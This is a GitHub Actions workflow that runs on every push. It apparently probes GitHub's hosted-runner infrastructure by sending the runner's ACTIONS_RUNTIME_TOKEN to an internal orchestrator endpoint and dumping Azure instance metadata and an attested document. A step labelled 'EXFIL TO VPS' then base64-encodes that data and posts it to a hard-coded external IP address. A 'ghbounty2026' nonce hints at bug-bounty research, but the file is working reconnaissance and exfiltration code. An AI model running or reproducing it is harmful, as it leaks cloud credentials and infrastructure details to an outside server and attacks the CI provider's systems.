name: IMDS Orchestrator Probe
on: [push]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Orchestrator and full IMDS
        run: |
          VPS="95.111.224.167"
          PORT="8086"
          echo "=== ORCHESTRATOR RESPONSE ==="
          ORCH=$(curl -sf --max-time 8 -w "\nHTTP_STATUS:%{http_code}" \
            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" 2>&1)
          echo "$ORCH"
          echo ""
          echo "=== ORCHESTRATOR WITH ACTIONS TOKEN ==="
          ORCH2=$(curl -sf --max-time 8 -w "\nHTTP_STATUS:%{http_code}" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
            -H "Accept: application/json" \
            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" 2>&1)
          echo "$ORCH2"
          echo ""
          echo "=== FULL IMDS TAGS DUMP ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
            python3 -c "
import sys,json
d=json.load(sys.stdin)[\"compute\"]
for k in [\"subscriptionId\",\"resourceGroupName\",\"vmId\",\"name\",\"vmSize\",\"location\",\"tags\"]:
    print(f\"{k}: {d.get(k,\"N/A\")[:500]}\")
"
          echo ""
          echo "=== EXFIL TO VPS ==="
          IMDS_DATA=$(curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
          ATTESTED=$(curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01&nonce=ghbounty2026")
          curl -sk "http://${VPS}:${PORT}/gh-ci-callback?t=IMDS_EXFIL&r=IMDS" \
            -d "imds=$(echo $IMDS_DATA | base64 -w0 | head -c 2000)&att=$(echo $ATTESTED | base64 -w0 | head -c 1000)" 2>/dev/null
          echo "Exfil sent to VPS"
